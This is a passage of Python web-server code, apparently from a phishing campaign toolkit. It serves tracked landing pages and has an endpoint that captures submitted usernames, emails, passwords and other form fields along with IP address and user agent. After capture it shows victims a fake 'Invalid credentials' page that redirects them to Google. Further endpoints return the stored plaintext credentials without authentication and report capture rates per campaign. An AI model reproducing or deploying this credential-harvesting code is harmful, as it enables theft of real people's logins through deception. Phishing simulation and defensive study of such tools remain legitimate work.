                page = next((p for p in prebuilt if p["id"] == campaign["landing_page_id"]), None)

            if page:
                html = page["html_content"]
                html = html.replace("{{page_id}}", campaign["landing_page_id"])
                html = html.replace("{{tracking_id}}", tracking_id)
                return HTMLResponse(content=html)

    # Default: return generic page
    return HTMLResponse(content="<html><body><h1>Page not found</h1></body></html>")


@router.post("/capture/{page_id}")
async def capture_credentials(page_id: str, request: Request):
    """Capture submitted credentials"""
    form_data = await request.form()

    tracking_id = form_data.get("tracking_id", "")
    campaign_id, target_id = decode_tracking_id(tracking_id)

    # Extract credentials
    creds = {
        "id": str(uuid.uuid4()),
        "campaign_id": campaign_id,
        "target_id": target_id,
        "target_email": "",
        "ip_address": request.client.host if request.client else "unknown",
        "user_agent": request.headers.get("user-agent", "unknown"),
        "captured_at": datetime.now().isoformat(),
        "other_fields": {}
    }

    for key, value in form_data.items():
        if key == "tracking_id":
            continue
        elif key in ["username", "email"]:
            creds["username"] = value
            if "@" in value:
                creds["target_email"] = value
        elif key == "password":
            creds["password"] = value
        else:
            creds["other_fields"][key] = value

    # Save credentials
    captured = load_json(CREDENTIALS_FILE, [])
    captured.append(creds)
    save_json(CREDENTIALS_FILE, captured)

    # Log event
    if campaign_id:
        log_tracking_event(
            campaign_id, target_id, "creds_submitted",
            creds["ip_address"], creds["user_agent"]
        )

        # Update campaign stats
        campaigns = load_json(CAMPAIGNS_FILE, [])
        for campaign in campaigns:
            if campaign["id"] == campaign_id:
                campaign["credentials_captured"] = campaign.get("credentials_captured", 0) + 1
                save_json(CAMPAIGNS_FILE, campaigns)

                # Get redirect URL
                if campaign.get("landing_page_id"):
                    pages_file = f"{DATA_DIR}/landing_pages.json"
                    pages = load_json(pages_file, [])
                    page = next((p for p in pages if p["id"] == campaign["landing_page_id"]), None)
                    if page and page.get("redirect_url"):
                        return Response(
                            status_code=302,
                            headers={"Location": page["redirect_url"]}
                        )
                break

    # Default redirect
    return HTMLResponse(content="""
    <html>
    <head><meta http-equiv="refresh" content="2;url=https://google.com"></head>
    <body style="font-family: Arial; text-align: center; padding: 50px;">
        <h2>Authentication Error</h2>
        <p>Invalid credentials. Please try again.</p>
        <p>Redirecting...</p>
    </body>
    </html>
    """)


@router.get("/captured")
async def get_captured_credentials(campaign_id: Optional[str] = None):
    """Get captured credentials"""
    captured = load_json(CREDENTIALS_FILE, [])

    if campaign_id:
        captured = [c for c in captured if c.get("campaign_id") == campaign_id]

    return {"credentials": captured, "count": len(captured)}


@router.get("/campaigns/{campaign_id}/stats")
async def get_campaign_stats(campaign_id: str):
    """Get detailed campaign statistics"""
    campaigns = load_json(CAMPAIGNS_FILE, [])
    campaign = next((c for c in campaigns if c["id"] == campaign_id), None)

    if not campaign:
        raise HTTPException(status_code=404, detail="Campaign not found")

    # Get events
    events_file = f"{DATA_DIR}/tracking_events.json"
    events = load_json(events_file, [])
    campaign_events = [e for e in events if e.get("campaign_id") == campaign_id]

    # Get captured credentials
    captured = load_json(CREDENTIALS_FILE, [])
    campaign_creds = [c for c in captured if c.get("campaign_id") == campaign_id]

    # Calculate rates
    total = campaign.get("total_targets", 0)
    sent = campaign.get("emails_sent", 0)
    opened = campaign.get("emails_opened", 0)
    clicked = campaign.get("links_clicked", 0)
    captured_count = len(campaign_creds)

    return {
        "campaign": campaign,
        "stats": {
            "total_targets": total,
            "emails_sent": sent,
            "emails_opened": opened,
            "links_clicked": clicked,
            "credentials_captured": captured_count,
            "open_rate": round((opened / sent * 100) if sent > 0 else 0, 1),
            "click_rate": round((clicked / sent * 100) if sent > 0 else 0, 1),
            "capture_rate": round((captured_count / clicked * 100) if clicked > 0 else 0, 1),
        },
        "events": campaign_events[-100:],  # Last 100 events
        "credentials": campaign_creds
    }
